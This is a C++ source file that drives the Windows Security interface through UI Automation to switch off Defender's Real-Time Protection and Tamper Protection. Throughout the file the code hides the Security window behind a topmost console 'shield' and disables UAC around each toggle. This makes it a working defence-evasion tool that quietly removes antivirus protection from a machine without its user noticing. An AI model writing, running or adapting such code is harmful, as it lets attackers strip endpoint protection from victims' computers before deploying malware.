// DefenderUI.cpp
// UI Automation implementation for Windows Defender Real-Time Protection and Tamper Protection

#include "DefenderUI.h"
#include "DefenderStealth.h"
#include <shellapi.h>
#include <thread>
#include <chrono>
#include <iostream>

using namespace std::chrono_literals;

#define DEBUG_LOGGING_ENABLED 0

#if DEBUG_LOGGING_ENABLED
    #define DEBUG_LOG(msg) std::wcout << msg << L"\n"
#else
    #define DEBUG_LOG(msg) ((void)0)
#endif

#define INFO_LOG(msg) std::wcout << L"[*] " << msg << L"\n"
#define ERROR_LOG(msg) std::wcout << L"[-] " << msg << L"\n"

// ============================================================================
// Constructor / Destructor
// ============================================================================

WindowsDefenderAutomation::WindowsDefenderAutomation() {
    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    CoCreateInstance(CLSID_CUIAutomation, nullptr, CLSCTX_INPROC_SERVER, IID_IUIAutomation, (void**)&pAutomation);
    
    // Recover UAC if previous run crashed
    DefenderStealth::RecoverUACIfNeeded();
}

WindowsDefenderAutomation::~WindowsDefenderAutomation() {
    if (pRootElement) pRootElement->Release();
    if (pAutomation) pAutomation->Release();
    CoUninitialize();
}

// ============================================================================
// Window Finder
// ============================================================================

struct FindWindowData {
    HWND hWndFound;
};

BOOL CALLBACK EnumWindowsCallback(HWND hwnd, LPARAM lParam) {
    FindWindowData* data = (FindWindowData*)lParam;
    wchar_t className[256] = { 0 };

    if (GetClassNameW(hwnd, className, 256)) {
        if (wcscmp(className, L"ApplicationFrameWindow") == 0 && IsWindowVisible(hwnd)) {
            data->hWndFound = hwnd;
            return FALSE;
        }
    }
    return TRUE;
}

HWND WindowsDefenderAutomation::findSecurityWindow(int maxRetries) {
    FindWindowData data = { 0 };

    for (int i = 0; i < maxRetries; ++i) {
        EnumWindows(EnumWindowsCallback, (LPARAM)&data);
        if (data.hWndFound) {
            return data.hWndFound;
        }
        std::this_thread::sleep_for(100ms);
    }
    return NULL;
}

// ============================================================================
// Cold Boot Detection and Pre-Warming
// ============================================================================

bool WindowsDefenderAutomation::isColdBoot() {
    return !DefenderStealth::CheckVolatileWarmMarker();
}

bool WindowsDefenderAutomation::preWarmDefender() {
    INFO_LOG(L"Cold boot detected - pre-warming Windows Defender");
    
    // Console shield is already active from openDefenderSettings
    ShellExecuteW(nullptr, L"open", L"windowsdefender://threatsettings", 
                  nullptr, nullptr, SW_SHOWMINNOACTIVE);
    
    std::this_thread::sleep_for(800ms);
    
    HWND hwnd = findSecurityWindow(10);
    
    if (hwnd) {
        DEBUG_LOG(L"Pre-warm window found, waiting for full initialization");
        std::this_thread::sleep_for(800ms);
        
        SetForegroundWindow(hwnd);
        std::this_thread::sleep_for(100ms);
        
        DEBUG_LOG(L"Closing pre-warm window");
        SendMessage(hwnd, WM_SYSCOMMAND, SC_CLOSE, 0);
        
        // Wait for window to close
        bool closed = false;
        for (int i = 0; i < 30; i++) {
            if (!IsWindow(hwnd) || !IsWindowVisible(hwnd)) {
                closed = true;
                break;
            }
            std::this_thread::sleep_for(100ms);
        }
        
        if (!closed) {
            DEBUG_LOG(L"Retry close with PostMessage");
            PostMessage(hwnd, WM_CLOSE, 0, 0);
            std::this_thread::sleep_for(1000ms);
        }
        
        DefenderStealth::SetVolatileWarmMarker();
        DEBUG_LOG(L"Pre-warm complete");
        return true;
    }
    
    DEBUG_LOG(L"Pre-warm window not found, continuing anyway");
    return false;
}

// ============================================================================
// Open Defender Settings
// ============================================================================

bool WindowsDefenderAutomation::openDefenderSettings() {
    DEBUG_LOG(L"Opening Windows Defender");
    
    // Set console as shield FIRST - before anything else can flash on screen
    DefenderStealth::SetConsoleTopmost();

    if (isColdBoot()) {
        // Pre-warming now happens safely behind the console shield
        preWarmDefender();
        std::this_thread::sleep_for(800ms);
        
        // Re-apply topmost in case OS changed Z-order during pre-warm window close
        DefenderStealth::SetConsoleTopmost();
    }
    
    ShellExecuteW(nullptr, L"open", L"windowsdefender://threatsettings", nullptr, nullptr, SW_SHOWMINNOACTIVE);
    
    hwndSecurity = findSecurityWindow(10);

    if (!hwndSecurity || !waitForUILoaded(50)) { 
        ERROR_LOG(L"Failed to load Defender UI (timeout on slow system)");
        DefenderStealth::RestoreConsoleNormal();
        return false;
    }
    return true;
}

bool WindowsDefenderAutomation::waitForUILoaded(int maxRetries) {
    for (int i = 0; i < maxRetries; ++i) {
        try {
            if (pRootElement) pRootElement->Release();
            HRESULT hr = pAutomation->ElementFromHandle(hwndSecurity, &pRootElement);
            
            if (SUCCEEDED(hr)) {
                if (countTotalElements() > 10) return true;
            }
        }
        catch (...) {}
        std::this_thread::sleep_for(100ms);
    }
    return false;
}

// ============================================================================
// UI Automation Helpers
// ============================================================================

IUIAutomationElement* WindowsDefenderAutomation::findFirstToggleSwitch() {
    IUIAutomationCondition* pCondition = nullptr;
    VARIANT var;
    var.vt = VT_I4;
    var.lVal = UIA_ButtonControlTypeId;
    pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, var, &pCondition);

    IUIAutomationElementArray* pButtons = nullptr;
    if (!pRootElement) return nullptr;
    
    HRESULT hr = pRootElement->FindAll(TreeScope_Descendants, pCondition, &pButtons);
    pCondition->Release();

    if (FAILED(hr) || !pButtons) return nullptr;

    int count = 0;
    pButtons->get_Length(&count);

    for (int i = 0; i < count; ++i) {
        IUIAutomationElement* pButton = nullptr;
        pButtons->GetElement(i, &pButton);
        
        IUIAutomationTogglePattern* pToggle = nullptr;
        hr = pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

        if (SUCCEEDED(hr) && pToggle != nullptr) {
            pToggle->Release();
            pButtons->Release();
            return pButton;
        }
        pButton->Release();
    }
    pButtons->Release();
    return nullptr;
}

IUIAutomationElement* WindowsDefenderAutomation::findLastToggleSwitch() {
    IUIAutomationCondition* pCondition = nullptr;
    VARIANT var;
    var.vt = VT_I4;
    var.lVal = UIA_ButtonControlTypeId;
    pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, var, &pCondition);

    IUIAutomationElementArray* pButtons = nullptr;
    if (!pRootElement) return nullptr;

    HRESULT hr = pRootElement->FindAll(TreeScope_Descendants, pCondition, &pButtons);
    pCondition->Release();

    if (FAILED(hr) || !pButtons) return nullptr;

    int count = 0;
    pButtons->get_Length(&count);
    IUIAutomationElement* pLastToggle = nullptr;

    for (int i = 0; i < count; ++i) {
        IUIAutomationElement* pButton = nullptr;
        pButtons->GetElement(i, &pButton);
        
        IUIAutomationTogglePattern* pToggle = nullptr;
        hr = pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

        if (SUCCEEDED(hr) && pToggle != nullptr) {
            pToggle->Release();
            if (pLastToggle) pLastToggle->Release();
            pLastToggle = pButton;
        } else {
            pButton->Release();
        }
    }
    pButtons->Release();
    return pLastToggle;
}

int WindowsDefenderAutomation::countTotalElements() {
    if (!pRootElement) return 0;
    IUIAutomationCondition* pCondition = nullptr;
    pAutomation->CreateTrueCondition(&pCondition);
    
    IUIAutomationElementArray* pElements = nullptr;
    pRootElement->FindAll(TreeScope_Descendants, pCondition, &pElements);
    pCondition->Release();

    int count = 0;
    if (pElements) {
        pElements->get_Length(&count);
        pElements->Release();
    }
    return count;
}

bool WindowsDefenderAutomation::waitForStructureChange(int baselineCount, bool expectIncrease, int timeoutSeconds) {
    DEBUG_LOG(L"Waiting for UI structure change");
    int maxLoops = timeoutSeconds * 10;
    
    for (int i = 0; i < maxLoops; ++i) {
        int currentCount = countTotalElements();
        bool structureChanged = expectIncrease ? (currentCount > baselineCount) : (currentCount < baselineCount);

        if (structureChanged) {
            std::this_thread::sleep_for(200ms);
            int recheckCount = countTotalElements();
            bool stable = expectIncrease ? (recheckCount > baselineCount) : (recheckCount < baselineCount);
            
            if (stable) {
                DEBUG_LOG(L"UI structure change confirmed");
                return true;
            }
        }
        std::this_thread::sleep_for(100ms);
    }
    DEBUG_LOG(L"UI structure change timeout");
    return false;
}

// ============================================================================
// Close Security Window
// ============================================================================

void WindowsDefenderAutomation::closeSecurityWindow() {
    if (hwndSecurity) {
        SendMessage(hwndSecurity, WM_CLOSE, 0, 0);
    }
    
    // Restore console to normal state and clear screen
    DefenderStealth::RestoreConsoleNormal();
    std::wcout << L"[*] Security window closed. Operation finished.\n";
}

// ============================================================================
// Real-Time Protection Operations
// ============================================================================

bool WindowsDefenderAutomation::toggleRealTimeProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) { DefenderStealth::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = false;
    if (pToggle) {
        ToggleState stateBefore;
        pToggle->get_CurrentToggleState(&stateBefore);
        int baseline = countTotalElements();

        pToggle->Toggle();
        pToggle->Release();
        pButton->Release();

        result = waitForStructureChange(baseline, (stateBefore == ToggleState_On));
        if (result) {
            if (stateBefore == ToggleState_On) {
                std::wcout << L"[+] Real-Time Protection disabled successfully\n";
            } else {
                std::wcout << L"[+] Real-Time Protection enabled successfully\n";
            }
        }
    } else {
        pButton->Release();
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::enableRealTimeProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) { 
        DefenderStealth::RestoreUAC(); 
        return false; 
    }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_Off) {
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, false);
            if (result) {
                std::wcout << L"[+] Real-Time Protection enabled successfully\n";
            }
        } else {
            INFO_LOG(L"RTP already enabled");
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::disableRealTimeProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) { DefenderStealth::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_On) {
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, true);
            if (result) {
                std::wcout << L"[+] Real-Time Protection disabled successfully\n";
            }
        } else {
            INFO_LOG(L"RTP already disabled");
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::getRealTimeProtectionStatus() {
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) return false;

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool isEnabled = false;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        isEnabled = (state == ToggleState_On);
        std::wcout << L"[*] RTP Status: " << (isEnabled ? L"ENABLED" : L"DISABLED") << L"\n";
        pToggle->Release();
    }
    pButton->Release();
    return isEnabled;
}

// ============================================================================
// Tamper Protection Operations
// ============================================================================

bool WindowsDefenderAutomation::toggleTamperProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) { DefenderStealth::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = false;
    if (pToggle) {
        ToggleState stateBefore;
        pToggle->get_CurrentToggleState(&stateBefore);
        int baseline = countTotalElements();

        pToggle->Toggle();
        pToggle->Release();
        pButton->Release();

        result = waitForStructureChange(baseline, (stateBefore == ToggleState_On));
        if (result) {
            if (stateBefore == ToggleState_On) {
                std::wcout << L"[+] Tamper Protection disabled successfully\n";
            } else {
                std::wcout << L"[+] Tamper Protection enabled successfully\n";
            }
        }
    } else {
        pButton->Release();
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::enableTamperProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) { 
        DefenderStealth::RestoreUAC(); 
        return false; 
    }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_Off) {
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, false);
            if (result) {
                std::wcout << L"[+] Tamper Protection enabled successfully\n";
            }
        } else {
            INFO_LOG(L"Tamper Protection already enabled");
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::disableTamperProtection() {
    if (!DefenderStealth::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) { DefenderStealth::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_On) {
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, true);
            if (result) {
                std::wcout << L"[+] Tamper Protection disabled successfully\n";
            }
        } else {
            INFO_LOG(L"Tamper Protection already disabled");
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    DefenderStealth::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::getTamperProtectionStatus() {
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) return false;

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool isEnabled = false;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        isEnabled = (state == ToggleState_On);
        std::wcout << L"[*] Tamper Protection Status: " << (isEnabled ? L"ENABLED" : L"DISABLED") << L"\n";
        pToggle->Release();
    }
    pButton->Release();
    return isEnabled;
}
